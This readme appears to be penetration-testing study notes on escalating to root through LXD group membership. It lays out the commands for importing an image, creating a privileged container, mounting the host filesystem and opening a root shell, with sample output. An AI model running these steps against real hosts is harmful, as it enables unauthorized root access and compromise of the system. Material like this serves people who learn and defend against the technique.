readme.md


<a id="org66fcd6b"></a>

## LXD

`Containers`
Containers operate at the operating system level and virtual machines at the hardware level. Containers thus share an operating system and isolate application processes from the rest of the system, while classic virtualization allows multiple operating systems to run simultaneously on a single system.

`Linux Container`
Linux Containers (`LXC`) is an operating system-level virtualization technique that allows multiple Linux systems to run in isolation from each other on a single host by owning their own processes but sharing the host system kernel for them.
The ease of use of `LXC` is their most significant advantage compared to classic virtualization techniques.

`Linux Demon`
Linux Daemon (LXD) is similar in some respects but is designed to contain a complete operating system. Thus it is not an application container but a system container. Before we can use this service to escalate our privileges, we must be in either the `lxc` or `lxd` group. We can find this out with the following command:

    id
    
    uid=1000(container-user) gid=1000(container-user) groups=1000(container-user),116(lxd)

`Find Image`
**From here on**, there are now several ways in which we can exploit LXC/LXD. We can either create our own container and transfer it to the target system or use an existing container. Unfortunately, administrators often use templates that have little to no security. This attitude has the consequence that we already have tools that we can use against the system ourselves.

    cd ContainerImages
    ls
    
    ubuntu-template.tar.xz

`Import Image`
Such templates often do not have passwords, especially if they are uncomplicated test environments. These should be quickly accessible and uncomplicated to use.
If we are a little lucky and there is such a container on the system, it can be exploited. For this, we need to `import this container` as an image.

    lxc image import ubuntu-template.tar.xz --alias ubuntutemp
    lxc image list
    
    +-------------------------------------+--------------+--------+-----------------------------------------+--------------+-----------------+-----------+-------------------------------+
    |                ALIAS                | FINGERPRINT  | PUBLIC |               DESCRIPTION               | ARCHITECTURE |      TYPE       |   SIZE    |          UPLOAD DATE          |
    +-------------------------------------+--------------+--------+-----------------------------------------+--------------+-----------------+-----------+-------------------------------+
    | ubuntu/18.04 (v1.1.2)               | 623c9f0bde47 | no    | Ubuntu bionic amd64 (20221024_11:49)     | x86_64       | CONTAINER       | 106.49MB  | Oct 24, 2022 at 12:00am (UTC) |
    +-------------------------------------+--------------+--------+-----------------------------------------+--------------+-----------------+-----------+-------------------------------+

`Create and Exploit`
After verifying that this image has been successfully imported, we can initiate the image and configure it by specifying the `security.privileged` flag and the root path for the container. This flag disables all isolation features that allow us to act on the host.

    lxc init ubuntutemp privesc -c security.privileged=true
    lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true

Once we have done that, we can start the container and log into it. In the container, we can then go to the path we specified to access the `resource` of the host system as `root`.

    lxc start privesc
    lxc exec privesc /bin/bash
    root@nix02:~# ls -l /mnt/root
    
    total 68
    lrwxrwxrwx   1 root root     7 Apr 23  2020 bin -> usr/bin
    drwxr-xr-x   4 root root  4096 Sep 22 11:34 boot
    drwxr-xr-x   2 root root  4096 Oct  6  2021 cdrom
    drwxr-xr-x  19 root root  3940 Oct 24 13:28 dev
    drwxr-xr-x 100 root root  4096 Sep 22 13:27 etc
    drwxr-xr-x   3 root root  4096 Sep 22 11:06 home
    lrwxrwxrwx   1 root root     7 Apr 23  2020 lib -> usr/lib
    lrwxrwxrwx   1 root root     9 Apr 23  2020 lib32 -> usr/lib32
    lrwxrwxrwx   1 root root     9 Apr 23  2020 lib64 -> usr/lib64
    lrwxrwxrwx   1 root root    10 Apr 23  2020 libx32 -> usr/libx32
    drwx------   2 root root 16384 Oct  6  2021 lost+found
    drwxr-xr-x   2 root root  4096 Oct 24 13:28 media
    drwxr-xr-x   2 root root  4096 Apr 23  2020 mnt
    drwxr-xr-x   2 root root  4096 Apr 23  2020 opt
    dr-xr-xr-x 307 root root     0 Oct 24 13:28 proc
    drwx------   6 root root  4096 Sep 26 21:11 root
    drwxr-xr-x  28 root root   920 Oct 24 13:32 run
    lrwxrwxrwx   1 root root     8 Apr 23  2020 sbin -> usr/sbin
    drwxr-xr-x   7 root root  4096 Oct  7  2021 snap
    drwxr-xr-x   2 root root  4096 Apr 23  2020 srv
    dr-xr-xr-x  13 root root     0 Oct 24 13:28 sys
    drwxrwxrwt  13 root root  4096 Oct 24 13:44 tmp
    drwxr-xr-x  14 root root  4096 Sep 22 11:11 usr
    drwxr-xr-x  13 root root  4096 Apr 23  2020 var
